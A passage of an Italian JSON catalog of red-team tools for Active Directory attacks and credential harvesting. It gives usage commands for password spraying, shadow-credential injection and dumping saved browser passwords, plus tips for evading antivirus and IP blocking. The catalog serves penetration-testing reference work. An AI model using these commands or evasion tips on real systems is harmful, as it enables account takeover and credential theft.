partendo da un utente low-privilege.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il rinominare account macchina (sAMAccountName change) più volte in pochi secondi è un IoC molto forte rilevato da MDI.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "pkinittools",
    "name": "PKINITtools",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dirkjanm/PKINITtools",
    "desc": "Toolkit Python per manipolare l'autenticazione Kerberos PKINIT (Certificate-based) e ottenere TGT/NTLM hash.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PKInitTools</strong> è una suite (che include <code>gettgtpkinit.py</code>) per interagire con la pre-autenticazione Kerberos basata su certificati (PKINIT). È fondamentale per sfruttare vulnerabilità in Active Directory Certificate Services (ADCS). Permette di richiedere un Ticket Granting Ticket (TGT) usando un certificato PFX (rubato o generato maliziosamente) e, successivamente, recuperare l'hash NTLM dell'account associato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auth via Certificato:</strong> Autenticarsi al dominio senza password, usando solo un certificato valido e la sua chiave privata.</p><p><strong>Unpac the Hash:</strong> Una volta ottenuto il TGT via PKINIT, permette di recuperare la chiave di sessione e l'hash NTLM dell'utente, tecnica nota come \"Unpacking\".</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Tipico workflow ADCS exploitation.</p><pre><code># Richiesta TGT con certificato PFX\npython3 gettgtpkinit.py -cert-pfx user.pfx -pfx-pass password domain/user ccache_file\n\n# Recupero hash NTLM dal TGT (se si possiede la chiave)\npython3 getnthash.py -key <AS-REP-KEY> domain/user</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>ADCS Exploitation:</strong> Se si sfrutta una vulnerabilità come ESC1 o ESC8 per ottenere un certificato amministrativo, questo tool è il ponte per trasformare quel certificato in un accesso Kerberos utilizzabile o in un hash per il cracking/pass-the-hash.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di PKINIT genera eventi specifici (4768 con PreAuthType 16 o 15). Se l'utente non usa smartcard abitualmente, è molto sospetto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "pywhisker",
    "name": "pywhisker",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ShutdownRepo/pywhisker",
    "desc": "Tool Python per sfruttare vulnerabilità \"Shadow Credentials\" (Key Trust Account) in AD e prendere controllo di account utente/computer.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PyWhisker</strong> sfrutta l'attributo <code>msDS-KeyCredentialLink</code> introdotto per Windows Hello for Business. Se un attaccante ha diritti di scrittura su questo attributo di un oggetto AD (es. tramite deleghe generiche), può iniettare una propria chiave pubblica (\"Shadow Credential\"). Questo permette di autenticarsi come quell'utente/computer usando PKINIT e ottenere un TGT, bypassando completamente la password dell'account.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Key Injection:</strong> Genera un certificato self-signed e aggiunge la chiave pubblica all'attributo target.</p><p><strong>TGT Acquisition:</strong> Usa la chiave privata associata per richiedere un TGT al KDC.</p><p><strong>Persistence:</strong> Tecnica eccellente per backdooring stealth, poiché non cambia la password dell'utente e l'attributo è raramente monitorato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script (parte di ThePorgs suite).</p><pre><code># Iniezione Shadow Credential su target\npython3 pywhisker.py -d domain.local -u atacante -p pass -t target_user --action \"add\"\n\n# Autenticazione con certificato generato\npython3 gettgtpkinit.py ... (usando il pfx generato da pywhisker)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Privilege Escalation & Persistence:</strong> Se si scopre di avere diritti <code>GenericWrite</code> o <code>WriteProperty</code> su un Domain Admin o un DC, PyWhisker trasforma quel permesso in compromissione totale in modo silenzioso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Modifiche a <code>msDS-KeyCredentialLink</code> generano eventi di Directory Service Change (5136), ma sono spesso ignorati. Defender for Identity inizia a rilevare queste anomalie.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kerberos-windows-scripts",
    "name": "kerberos_windows_scripts",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerberos_windows_scripts",
    "desc": "Collezione di script Bash per interagire con Kerberos (kinit, klist, rpc) da Linux senza dipendenze pesanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo repository (spesso associato a ropnop o risorse simili) fornisce un set di script Bash leggeri per gestire l'autenticazione Kerberos direttamente da un terminale Linux (es. Kali o una macchina compromessa). Permette di richiedere ticket (TGT/TGS), listare la cache e interagire con servizi RPC senza dover installare suite pesanti come Impacket, sfruttando i binari nativi <code>krb5-user</code>.</p><br><hr><h4 class=\"rt-purple\">Script principali</h4><p><strong>kinit wrappers:</strong> Script per automatizzare la richiesta di TGT con password o keytab, gestendo automaticamente la configurazione del realm in <code>krb5.conf</code> se necessario.</p><p><strong>Ticket Management:</strong> Utility per visualizzare (<code>klist</code> wrapper), rinnovare o distruggere ticket nella cache, essenziale per passare da un'identità compromessa all'altra.</p><p><strong>RPC Interaction:</strong> Helper per usare <code>rpcclient</code> con autenticazione Kerberos (flag <code>-k</code>) sfruttando il ticket in cache per enumerazione SMB/RPC stealth.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire gli script dalla shell dopo aver installato i client krb5.</p><pre><code># Autenticazione e ottenimento TGT\n./init_krb.sh user@DOMAIN.LOCAL Password123\n\n# Enumerazione RPC usando il ticket\nrpcclient -k dc01.domain.local -c \"enumdomusers\"</code></pre><p>La variabile d'ambiente <code>KRB5CCNAME</code> viene spesso gestita per puntare al ticket corretto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Perfetto per scenari <strong>Living off the Land</strong> su server Linux compromessi che sono già joinati al dominio (es. server web SSSD). Permette di usare l'identità della macchina o di un utente compromesso per muoversi lateralmente senza caricare tool esterni sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede che il pacchetto <code>krb5-user</code> sia installato. Il traffico Kerberos verso il DC è legittimo, ma l'uso anomalo (es. troppi TGT request) può essere loggato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "kerbrute",
    "name": "kerbrute",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool per enumerazione utenti e password spraying via Kerberos Pre-Auth, stealth rispetto ai log di login classici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Kerbrute</strong> sfrutta il protocollo Kerberos (porta 88 UDP/TCP) per validare username e testare password. Poiché la pre-autenticazione Kerberos avviene prima del login SMB/RPC, questo metodo è molto più veloce e genera meno eventi di sicurezza critici (4625) rispetto ai metodi tradizionali. È lo strumento d'elezione per attacchi di password spraying in ambienti AD.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Distingue tra utenti validi e non validi basandosi sui codici di errore Kerberos, permettendo di pulire liste di username sporche.</p><p><strong>Lockout Safe Spray:</strong> In modalità spray (una password, molti utenti), il rischio di bloccare account è minimo se usato correttamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Binario Go standalone (Linux/Windows/Mac).</p><pre><code># Enumerazione utenti da lista\n./kerbrute userenum --dc 10.0.0.1 -d domain.local users.txt\n\n# Password Spraying\n./kerbrute passwordspray -d domain.local users.txt \"Welcome123\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Network Pentest:</strong> Per ottenere il primo accesso valido (Initial Access) testando password comuni (StagioneAnno!) contro tutti gli utenti del dominio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Monitorato da Defender for Identity (MDI) che rileva picchi di traffico AS-REQ. Usare con cautela.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "dehashed",
    "name": "Dehashed",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Motore di ricerca e intelligence per credenziali compromesse e asset nel deep web, interrogabile via web o API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DeHashed</strong> è una piattaforma di data mining e intelligence che indicizza miliardi di asset compromessi provenienti da breach pubblici e privati. A differenza di semplici checker, permette ricerche avanzate (wildcard, regex) su email, username, password, hash, indirizzi IP e nomi fisici. È uno strumento fondamentale per la fase di ricognizione passiva (OSINT) e per arricchire i dati durante un engagement, permettendo di trasformare un singolo indicatore (es. un'email) in un profilo completo di credenziali potenzialmente valide.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Advanced Search Query:</strong> Supporta operatori complessi per filtrare i risultati. È possibile cercare tutte le password associate a un dominio specifico (<code>domain:target.com</code>) o trovare utenti che hanno utilizzato una password specifica (<code>password:\"Company2023!\"</code>), utile per identificare pattern di riutilizzo.</p><p><strong>Breach Monitoring:</strong> Permette di monitorare asset aziendali in tempo reale, ricevendo alert quando nuove credenziali relative al proprio dominio appaiono in dump o leak nel dark web.</p><p><strong>Hash Cracking (Lookup):</strong> Il database contiene spesso sia l'hash che la password in chiaro decifrata da leak precedenti, risparmiando tempo di cracking costoso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accessibile via interfaccia web o API (per integrazione con tool come <code>DeHashed-API-Wrapper</code> o <code>Maltego</code>).</p><pre><code># Esempio query web per trovare credenziali admin\nemail:admin@target.com AND password:*\n\n# Ricerca inversa da un hash NTLM trovato\nhash:8846F7EAEE8FB117AD06BDD830B7586C\n\n# Ricerca ampia su dominio escludendo sottodomini noise\ndomain:target.com AND NOT email:support@*</code></pre><p>I risultati possono essere esportati in JSON/CSV per analisi offline.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>OSINT & Recon</strong>, fornisce la \"benzina\" per attacchi di Credential Stuffing o Password Spraying senza inviare un singolo pacchetto verso il bersaglio.</p><p>In <strong>Incident Response</strong>, aiuta a verificare se le credenziali di un utente compromesso erano già presenti in breach storici (es. Collection #1) o se sono frutto di un attacco recente (es. InfoStealer malware).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'attività è totalmente <strong>passiva</strong>. Nessuna interazione avviene con i sistemi del target, rendendo questa fase invisibile ai difensori aziendali.</p><p><strong>Impatto operativo:</strong> Nessuno sui sistemi target. Tuttavia, maneggiare database di credenziali reali richiede rispetto delle normative privacy e policy di engagement etico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "dehashed-py",
    "name": "dehashed.py",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Python wrapper per interrogare le API di DeHashed.com da riga di comando, per credential harvesting automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script funge da interfaccia CLI per il motore di ricerca DeHashed. Invece di usare l'interfaccia web, permette di eseguire query massive direttamente dal terminale, scaricando dump di credenziali compromesse (email, username, password, hash) in formato JSON o testo. È progettato per essere integrato in pipeline di ricognizione automatica o script di OSINT.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bulk Query:</strong> Accetta liste di domini o email e interroga le API sequenzialmente, gestendo la paginazione dei risultati.</p><p><strong>Output Parsing:</strong> Filtra automaticamente i risultati \"spazzatura\" e formatta l'output per essere passato direttamente a tool di password cracking (es. estraendo solo gli hash) o spraying.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede una API Key valida configurata.</p><pre><code># Ricerca credenziali per un dominio\npython3 dehashed.py -d target.com -o results.json\n\n# Ricerca inversa da hash\npython3 dehashed.py -q \"hash:5f4dcc3b5aa765d61d8327deb882cf99\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>OSINT Automatica:</strong> Inserito in uno script bash che gira ogni notte, può monitorare nuovi leak relativi ai domini dei clienti e allertare il team di sicurezza proattivamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Passivo (traffico verso DeHashed, non verso il target). Gestire con cura i file di output contenenti PII e password reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "firefox-decrypt-main",
    "name": "firefox_decrypt-main",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/unode/firefox_decrypt",
    "desc": "Script Python per estrarre e decifrare password salvate nei profili Mozilla (Firefox, Thunderbird) anche con Master Password.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Firefox Decrypt è uno strumento forense in grado di leggere i database dei profili Mozilla (file <code>logins.json</code> e <code>key4.db</code>) per estrarre le credenziali salvate. Funziona su profili Firefox, Thunderbird e derivati. Se è impostata una Master Password, lo script chiede l'input utente per derivare la chiave di decifratura, rendendolo efficace anche contro profili protetti se si conosce la password principale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-Platform:</strong> Funziona su profili copiati da Windows, Linux o Mac, poiché il formato database Mozilla è standard.</p><p><strong>Thunderbird Support:</strong> Oltre ai siti web, recupera password IMAP/SMTP/POP3 dai client di posta, spesso critiche per il movimento laterale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Puntare lo script alla cartella del profilo.</p><pre><code># Scansione automatica path default\npython3 firefox_decrypt.py\n\n# Decifratura profilo esportato\npython3 firefox_decrypt.py /tmp/profilo_vittima/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Workstation:</strong> Dopo aver compromesso un PC, esfiltrare la cartella del profilo Firefox e decifrarla offline permette di ottenere accessi a portali web interni, VPN SSL e webmail.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Accesso ai file del profilo mentre il browser è aperto può fallire. Operazione locale di lettura file.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "lazagne-2-4-7",
    "name": "LaZagne",
    "version": "2.4.7",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/AlessandroZ/LaZagne",
    "desc": "Tool forense/offensivo all-in-one per recuperare password salvate localmente da browser, chat, database, wifi e sysadmin tool.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LaZagne</strong> è un'applicazione post-exploitation open source utilizzata per recuperare le molteplici password che gli utenti salvano quotidianamente sul proprio computer. Supporta Windows, Linux e macOS. Il tool scansiona il file system e il registro alla ricerca di credenziali memorizzate da browser, client di posta, database manager, strumenti di amministrazione (es. Putty, WinSCP) e configurazioni WiFi, decifrandole quando possibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Supporto Multi-Software:</strong> Include decine di moduli specifici per estrarre password da Chrome, Firefox, Outlook, Thunderbird, FileZilla, PuTTY, OpenSSH, VNC, Network Manager e molti altri.</p><p><strong>Decifratura Locale:</strong> Utilizza le API di sistema (come DPAPI su Windows o GNOME Keyring su Linux) o algoritmi noti per decifrare le password offuscate trovate nei file di configurazione.</p><p><strong>Esecuzione in Memoria:</strong> Su Windows, può essere caricato riflessivamente o eseguito come standalone senza dipendenze Python esterne (usando la versione compilata PyInstaller), facilitando l'uso su macchine compromesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare l'eseguibile da riga di comando. Senza argomenti tenta tutti i moduli.</p><pre><code># Esecuzione completa (Tutti i moduli)\nlazagne.exe all\n\n# Solo browser e output su file\nlazagne.exe browsers -oN -o output.txt\n\n# Specifico per WiFi (richiede Admin)\nlazagne.exe wifi</code></pre><p>Su Linux/Mac: <code>python3 laZagne.py all</code>. I risultati vengono stampati a video e possono essere salvati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong> su una workstation compromessa, LaZagne è spesso il passo più veloce per ottenere credenziali per muoversi lateralmente (es. password di root del database salvata in un client SQL, o chiave SSH privata non protetta da passphrase). Essenziale per dimostrare il rischio del salvataggio password nei browser.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La maggior parte degli antivirus ed EDR rileva LaZagne basandosi sulla firma dell'eseguibile o sul comportamento (accesso massivo a file di configurazione browser/mail). L'uso della DPAPI genera eventi di sistema.</p><p><strong>Mitigazioni:</strong> Non usare l'EXE standard. Eseguire tramite Python se presente sul target, o ricompilare/offuscare il codice. Eseguire solo moduli specifici necessari per ridurre il rumore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "mailsniper",
    "name": "MailSniper",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dafthack/MailSniper",
    "desc": "Toolkit PowerShell per cercare dati sensibili nelle caselle di posta Exchange/O365, eseguire password spraying e testare injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MailSniper</strong> è uno strumento offensivo dedicato agli ambienti Microsoft Exchange e Office 365. È progettato per due scopi principali: la ricerca di dati sensibili (termini come \"password\", \"credenziali\", \"fattura\") all'interno delle email di un'organizzazione e l'esecuzione di attacchi di password spraying contro OWA (Outlook Web Access) e EWS (Exchange Web Services). È potente per trasformare un singolo account email compromesso in una compromissione di dati massiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Global Address List (GAL) Dumping:</strong> Scarica l'elenco completo degli indirizzi email dell'azienda per creare liste target precise per attacchi successivi.</p><p><strong>Keyword Search (Self & Delegate):</strong> Cerca termini specifici nella casella di posta dell'utente corrente e in tutte le caselle su cui l'utente ha permessi di delega. Utile per trovare VPN config, password inviate via mail o dati finanziari.</p><p><strong>Password Spraying OWA/EWS:</strong> Esegue attacchi di brute-force distribuito (spraying) contro i portali web di posta, supportando la rotazione degli host e il controllo dei tempi per evitare il blocco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Importare il modulo PowerShell.</p><pre><code># Ricerca termini sensibili nella mailbox corrente\nInvoke-SelfSearch -MailboxUser user@domain.com\n\n# Password Spraying contro OWA\nInvoke-PasswordSprayOWA -Url https://mail.corp.com/owa -UserList users.txt -Password \"Estate2024!\"\n\n# Ricerca su tutte le mailbox (Richiede Admin Exchange)\nInvoke-GlobalMailSearch -ImpersonationUser Admin -ExchHostname mail.corp.com -Terms \"password\",\"secret\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In uno scenario di <strong>Internal Threat</strong> o <strong>Compromised User</strong>, MailSniper automatizza la ricerca di informazioni sfruttabili tra migliaia di email storiche. Il password spraying su OWA è spesso l'unico vettore disponibile dall'esterno se la VPN richiede certificati o MFA (anche se OWA dovrebbe avere MFA).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo spraying su OWA genera molti log di accesso fallito (IIS logs, Event logs). La ricerca massiva via EWS genera traffico anomalo e carico sul server Exchange.</p><p><strong>Mitigazioni:</strong> Usare l'opzione <code>-Sleep</code> per rallentare le richieste. Per la ricerca, limitarsi a mailbox chiave o termini specifici per ridurre il tempo di connessione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "net-creds",
    "name": "net-creds",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/DanMcInerney/net-creds",
    "desc": "Script Python per sniffing passivo di credenziali e hash (HTTP, FTP, NTLM, Kerberos, ecc.) da interfaccia di rete o pcap.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Net-Creds</strong> è uno sniffer leggero focalizzato esclusivamente sull'estrazione di dati sensibili dal traffico di rete. Analizza i pacchetti in transito per identificare stringhe di autenticazione in chiaro (Basic Auth, FTP, POP3) o challenge crittografici (NTLM, Kerberos, SNMP). È progettato per essere eseguito silenziosamente su una macchina compromessa o durante un Man-in-the-Middle.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Parsing:</strong> Riconosce automaticamente i protocolli e formatta l'output mostrando IP sorgente, destinazione, username e password/hash.</p><p><strong>Pcap Support:</strong> Può analizzare file di cattura registrati precedentemente, utile per analisi forense offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede privilegi root per l'accesso raw socket.</p><pre><code># Sniffing live su interfaccia\nsudo python2 net-creds.py -i eth0\n\n# Lettura da file pcap\npython2 net-creds.py -p capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation:</strong> Lasciato in esecuzione su un server file o un gateway compromesso, raccoglie le credenziali di chiunque vi acceda. Utile per verificare se applicazioni interne usano ancora HTTP o FTP non cifrato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Modalità promiscua della NIC può essere rilevata localmente. Nessun traffico generato in rete (passivo).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "pcredz",
    "name": "PCredz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/lgandx/PCredz",
    "desc": "Sniffer passivo che estrae credenziali (NTLM, HTTP Basic, FTP, POP3, SMTP, SNMP) e hash dal traffico di rete o file pcap.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PCredz</strong> è uno strumento di Network Forensics e Credential Harvesting passivo. Analizza il traffico di rete in tempo reale (o file .pcap registrati) per identificare pattern di autenticazione e estrarre credenziali in chiaro o hash. A differenza di Responder (che è attivo/poisoner), PCredz si limita ad ascoltare silenziosamente, rendendolo molto difficile da rilevare.</p><br><hr><h4 class=\"rt-purple\">Protocolli supportati</h4><p><strong>Cleartext:</strong> Cattura credenziali HTTP Basic, FTP, POP3, IMAP, SMTP, Telnet e SNMP community strings (v1/v2).</p><p><strong>Hash/Challenge:</strong> Estrae hash NTLMv1/v2 (da HTTP/SMB/LDAP) e Kerberos hashes, formattandoli automaticamente per essere passati a Hashcat o John the Ripper.</p><p><strong>Credit Cards:</strong> Include regex per identificare numeri di carte di credito che transitano in chiaro (raro ma possibile in reti legacy).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede permessi di root per mettere l'interfaccia in modalità promiscua.</p><pre><code># Ascolto live sull'interfaccia eth0\n./Pcredz -i eth0\n\n# Analisi di un file pcap catturato precedentemente\n./Pcredz -f capture.pcap</code></pre><p>Le credenziali catturate vengono salvate nel file <code>CredentialDump-Session.log</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In uno scenario di <strong>Internal Network Assessment</strong>, lasciare PCredz in esecuzione su un dispositivo compromesso (o Raspberry Pi \"dropbox\") per qualche ora può raccogliere credenziali di amministratori che si collegano a servizi legacy. Ottimo per validare se il traffico sensibile è cifrato (SSL/TLS) o meno.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Passivo e invisibile sulla rete. Tuttavia, mettere la scheda di rete in modalità promiscua può essere rilevato localmente dall'OS o da tool di monitoraggio hardware.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "credking",
    "name": "CredKing",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ustayready/CredKing",
    "desc": "Framework di password spraying che utilizza AWS Lambda (FireProx) per rotazione IP e evasione intelligente del blocco account.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CredKing</strong> porta il password spraying a un livello superiore integrando tecniche di evasione IP avanzate. Utilizza AWS API Gateway e Lambda (tramite FireProx) per ruotare l'indirizzo IP sorgente ad ogni richiesta, rendendo inutile il blocco IP da parte dei difensori. Supporta plugin per target multipli come Office 365, Okta, Gmail e SMB, gestendo automaticamente le finestre di lockout.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP Rotation (FireProx):</strong> La caratteristica distintiva. Invece di attaccare dal tuo IP (che verrebbe bannato), CredKing lancia le richieste attraverso infrastruttura cloud effimera, apparendo come traffico legittimo AWS diverso ad ogni tentativo.</p><p><strong>Plugin Modulari:</strong> Architettura estensibile per aggiungere nuovi target di login (es. portali VPN proprietari, app web custom).</p><p><strong>Smart Spraying:</strong> Algoritmi per distribuire i tentativi nel tempo e tra gli utenti, minimizzando la probabilità di triggerare soglie di allarme comportamentale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede configurazione AWS e credenziali. Esecuzione via Python.</p><pre><code># Spraying su O365 con rotazione IP\npython3 credking.py --plugin o365 --userfile users.txt --password \"Password123!\" --threads 5\n\n# Spraying su Okta\npython3 credking.py --plugin okta --target https://corp.okta.com --userfile users.txt --password \"Welcome1\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Indispensabile per <strong>Red Teaming</strong> contro target maturi che implementano Geo-blocking o IP-based rate limiting. Quando un attacco Hydra standard fallisce dopo 3 tentativi per ban IP, CredKing continua imperterrito. Efficace per testare la robustezza delle policy di password esterne.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene l'IP cambi, il pattern di \"molti login falliti su molti account\" è comunque visibile nei log applicativi del target. L'User-Agent potrebbe necessitare di tuning.</p><p><strong>Impatto operativo:</strong> Basso rischio tecnico, ma alto rischio di rilevamento procedurale.</p><p><strong>Mitigazioni:</strong> Usare password molto comuni per massimizzare il successo al primo tentativo. Monitorare attentamente le risposte per fermarsi se il target implementa CAPTCHA.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "decrypt-chrome-passwords-main",
    "name": "decrypt-chrome-passwords",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ohyicong/decrypt-chrome-passwords",
    "desc": "Tool specializzato per estrarre e decifrare credenziali salvate nel database SQLite di Google Chrome (Login Data) via DPAPI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo strumento si focalizza specificamente sul browser Google Chrome (e derivati Chromium). Automatizza il processo di localizzazione del file <code>Login Data</code>, estrazione della chiave di crittografia (memorizzata in <code>Local State</code> e protetta da DPAPI utente) e decifratura delle password. È una versione più mirata e leggera rispetto a suite complete come LaZagne.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Estrazione Master Key:</strong> Recupera la chiave master di Chrome decifrandola tramite le API di Windows (CryptUnprotectData), necessaria per le versioni recenti del browser (v80+).</p><p><strong>Parsing SQLite:</strong> Legge il database locale di Chrome, estraendo URL, username e blob cifrati delle password, gestendo le differenze di schema tra versioni.</p><p><strong>Output Pulito:</strong> Fornisce le credenziali in chiaro pronte per essere usate o esfiltrate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script (Python o EXE) sulla macchina target con l'utente vittima loggato.</p><pre><code># Esecuzione standard\npython3 decrypt_chrome.py\n\n# Output su CSV\npython3 decrypt_chrome.py --output credentials.csv</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilissimo in script di <strong>Automated Post-Exploitation</strong> (es. via USB Rubber Ducky o payload in memoria) per rubare rapidamente accessi web senza dipendenze pesanti. Le credenziali web spesso aprono porte a portali cloud, mail o accessi VPN aziendali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Accesso al file <code>Login Data</code> mentre Chrome è aperto potrebbe fallire (file lock) o generare errori. L'uso di API crittografiche di sistema è monitorabile.</p><p><strong>Mitigazioni:</strong> Copiare i file del database in una temp folder prima di leggerli per evitare lock e ridurre tracce di accesso diretto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "htb-wordlist",
    "name": "HTB-wordlist",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
